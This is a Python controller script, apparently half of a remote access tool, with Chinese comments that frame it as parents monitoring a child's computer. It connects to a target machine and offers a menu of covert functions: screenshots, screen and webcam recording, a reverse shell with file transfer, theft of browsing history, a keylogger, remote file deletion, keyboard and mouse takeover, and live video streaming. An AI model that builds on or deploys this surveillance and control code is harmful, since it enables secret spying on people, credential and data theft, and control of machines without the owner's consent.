import threading
import pynput
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep
import socket
import struct
import os
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import cv2
import numpy as np
from tkinter import Tk, Label
from PIL import Image, ImageTk
import pickle

# client.py
# 我會控制 client 端
# 我現在是 client (父母) 我需要向 server (小孩) 進行連接
# 然後我需要向 server (小孩) 發送指令
# 並接收 " 回傳的資料 "

# 全局變量
keyboard_control_enabled = False
keyboard_listener_thread = None
stop_event = None
clients_lock = threading.Lock()
shutdown_flag = threading.Event()

# 接受 server 回傳的資料
def receive_file(conn):
    fileinfo_size = struct.calcsize('128sl')

    # 確保接收到足夠的數據
    buf = b''
    while len(buf) < fileinfo_size:
        packet = conn.recv(fileinfo_size - len(buf))
        if not packet:
            raise ConnectionError("Connection lost while receiving file info")
        buf += packet

    if len(buf) == fileinfo_size:
        filename, filesize = struct.unpack('128sl', buf)
        filename = filename.strip(b'\x00').decode()

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        directory = os.path.join('./received_files', time.strftime("%Y/%m%d"))
        os.makedirs(directory, exist_ok=True)

        base, ext = os.path.splitext(filename)
        new_filename = os.path.join(directory, f"{timestamp}_{base}{ext}")

        recvd_size = 0
        with open(new_filename, 'wb') as file:
            while recvd_size < filesize:
                chunk_size = min(filesize - recvd_size, 1024)
                data = conn.recv(chunk_size)
                if not data:
                    print("Connection lost during file transfer")
                    break
                recvd_size += len(data)
                file.write(data)

        # 確認結束標誌
        end_marker = conn.recv(1024)
        if end_marker != b"END":
            print(f"Unexpected end marker: {end_marker}")

        print(f"{new_filename} 接收完")
    else:
        print(f"Received data of incorrect size: expected {fileinfo_size}, got {len(buf)}")

# reverse_shell
def handle_reverse_shell(conn):
    try:    
        while True:
            cmd = input("Enter your command : ")
            if cmd == "exit":
                conn.send(cmd.encode())
                break
            elif cmd.startswith("down"):
                conn.send(cmd.encode())
                data = b""
                while True:
                    end_data = conn.recv(1024)

                    # 如果收到 'Ended'，則停止接收
                    if end_data == b"Ended":
                        print("File transfer ended :)")
                        break

                    data += end_data

                # 將收到的數據寫入文件
                f_name = input("Enter output file name: ")
                with open(f_name, "wb") as new_f:
                    new_f.write(data)
            elif cmd.startswith("up "):
                cmd_list = cmd.split(" ")

                file = cmd_list[1]
                file = open(file,"rb")
                data = file.read()
                file.close()

                conn.send(cmd.encode())
                while True:
                    if len(data)>0:
                        temp_data = data[:1024]
                        if len(temp_data) < 1024:
                            temp_data += chr(0).encode() * (1024 - len(temp_data))

                        data = data[1024:]

                        conn.send(temp_data)
                        print("*",end="")
                    else:
                        conn.send(b"Ended")
                        e = conn.recv(1024).decode()
                        print(e)
                        #sleep(5)
                        break
            elif cmd:
                conn.send(cmd.encode())
                response = conn.recv(4096).decode()  # Adjust buffer size as needed
                print(response)
            else:
                print("Command cannot be empty")
    except (BrokenPipeError, ConnectionResetError, socket.error) as e:
        print(f"Client disconnected during reverse shell: {e}")
    finally:
        print("Exiting reverse shell and returning to client selection.")

def send_key_to_client(conn, event_type, key):
    try:
        data = f"{event_type}:{key}"
        conn.send(data.encode())
    except Exception as e:
        print(f"Error sending key to client: {e}")

def on_press(key, conn):
    try:
        send_key_to_client(conn, "press", key.char)
    except AttributeError:
        send_key_to_client(conn, "press", str(key))

def on_release(key, conn):
    send_key_to_client(conn, "release", str(key))

def keyboard_listener(conn, stop_event):
    with pynput.keyboard.Listener(
        on_press=lambda key: on_press(key, conn),
        on_release=lambda key: on_release(key, conn)
    ) as listener:
        while not stop_event.is_set():
            listener.join(0.1)
        listener.stop()

def mouse_control_loop(conn):
    while True:
        mouse_command = input("Enter command (e.g., move 100 200, press right, press left, roller up, roller down, exit to stop): ")
        conn.send(mouse_command.encode())
        if mouse_command.lower() == 'exit':
            print("Exiting mouse control")
            break

def receive_video_stream(host, port):
    global cap, root, label

    # 設置伺服器套接字
    v_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    v_socket.bind((host, port))
    v_socket.listen(1)
    # print(f"正在監聽 {host}:{port}...")
    conn, addr = v_socket.accept()
    # print(f"已連接到 {addr}")

    # 設置 tkinter 窗口
    root = Tk()
    root.title("視頻流")
    label = Label(root)
    label.pack()

    # 更新畫面的函數
    def update_frame():
        try:
            # 接收畫面大小
            data = conn.recv(4)
            if not data:
                return
            frame_size = int.from_bytes(data, byteorder='big')

            # 接收畫面數據
            frame_data = b""
            while len(frame_data) < frame_size:
                frame_data += conn.recv(frame_size - len(frame_data))

            # 轉換為 numpy 陣列並顯示
            frame = np.frombuffer(frame_data, dtype=np.uint8).reshape((480, 640, 3))  # 根據需要調整形狀
            rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            image = Image.fromarray(rgb_frame)
            photo = ImageTk.PhotoImage(image=image)
            label.config(image=photo)
            label.image = photo

            root.after(30, update_frame)  # 每 30 毫秒更新一次
        except Exception as e:
            print(f"更新畫面時出錯: {e}")

    update_frame()
    root.mainloop()

# 對 server 發送指令
def handle_server(conn, address):
    global keyboard_control_enabled
    global keyboard_listener_thread
    global stop_event

    while True:
        command = input(f" Enter command: \n"
                       "     M  : start remote control keyboard\n"
                       "     S  : stop remote control keyboard\n"
                       "     1  : screenshots\n"
                       "     2  : screen recording\n"
                       "     3  : camera recording\n"
                       "     4  : reverse shell\n"
                       "     5  : web history\n"
                       "     6  : start keylogger\n"
                       "     7  : stop keylogger\n"
                       "     8  : file delete\n"
                       "     9  : close & file delete\n"
                       "     10 : mouse control\n"
                       "     V  : start stream video\n"
                       "     0 to Reset selected server (小孩)\n=> ")

        if command == 'V':
            video_thread = threading.Thread(target=receive_video_stream, args=('0.0.0.0', 5001))
            video_thread.start()
            time.sleep(5) 
        if command == '0':
            print("Disconnecting from server...")
            break
        elif command == 'M':
            if not keyboard_control_enabled:
                keyboard_control_enabled = True
                stop_event = threading.Event()
                keyboard_listener_thread = threading.Thread(target=keyboard_listener, args=(conn, stop_event))
                keyboard_listener_thread.start()
                print("Remote keyboard control started.")
            else:
                print("Remote keyboard control is already running.")
        elif command == 'S':
            if keyboard_control_enabled:
                keyboard_control_enabled = False
                stop_event.set()
                keyboard_listener_thread.join()
                print("Remote keyboard control stopped.")
            else:
                print("Remote keyboard control is not running.")
        else:
            try:
                conn.send(command.encode())
                if command == '1':
                    num_screenshots = input("Enter number of screenshots: ")
                    if num_screenshots.isdigit():
                        num_screenshots = int(num_screenshots)
                        conn.send(str(num_screenshots).encode())
                        for _ in range(num_screenshots):
                            receive_file(conn)
                    else:
                        print("Invalid number of screenshots")
                elif command == '2':
                    s_duration = input("Enter the duration for recording: ")
                    conn.send(str(s_duration).encode())
                    receive_file(conn)
                elif command == '3':
                    c_duration = input("Enter the duration for recording: ")
                    conn.send(str(c_duration).encode())
                    receive_file(conn)
                elif command == '4':
                    handle_reverse_shell(conn)
                elif command == '5':
                    receive_file(conn)
                elif command == '6':
                    print('開始鍵盤記錄')
                elif command == '7':
                    print('停止鍵盤記錄')
                    with ThreadPoolExecutor() as executor:
                        future = executor.submit(receive_file, conn)
                        future.result()  # Wait for the result
                elif command == '8':
                    print('刪除檔案')
                elif command == '9':
                    print('電腦關機')
                elif command == '10':
                    mouse_control_loop(conn)
                else:
                    print("Invalid command.")
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                print(f"Error sending command to client : {e}")
                break  # 跳出循環，結束該 client 的處理
        time.sleep(1)

# 連接小孩 
def client_program():
    host = '127.0.0.1'
    port = 9999

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((host, port))
        print(f"Connected to server at {host}:{port}")
    except socket.error as e:
        print(f"Connection error: {e}")
        return

    with ThreadPoolExecutor(max_workers=10) as executor:
        try:
            selection_thread = threading.Thread(target=handle_server, args=(client_socket, client_socket.getpeername()))
            selection_thread.daemon = True
            selection_thread.start()
            selection_thread.join()
        except KeyboardInterrupt:
            print("Interrupted by user.")
        finally:
            client_socket.close()
            print("Connection closed.")

if __name__ == "__main__":
    client_program()
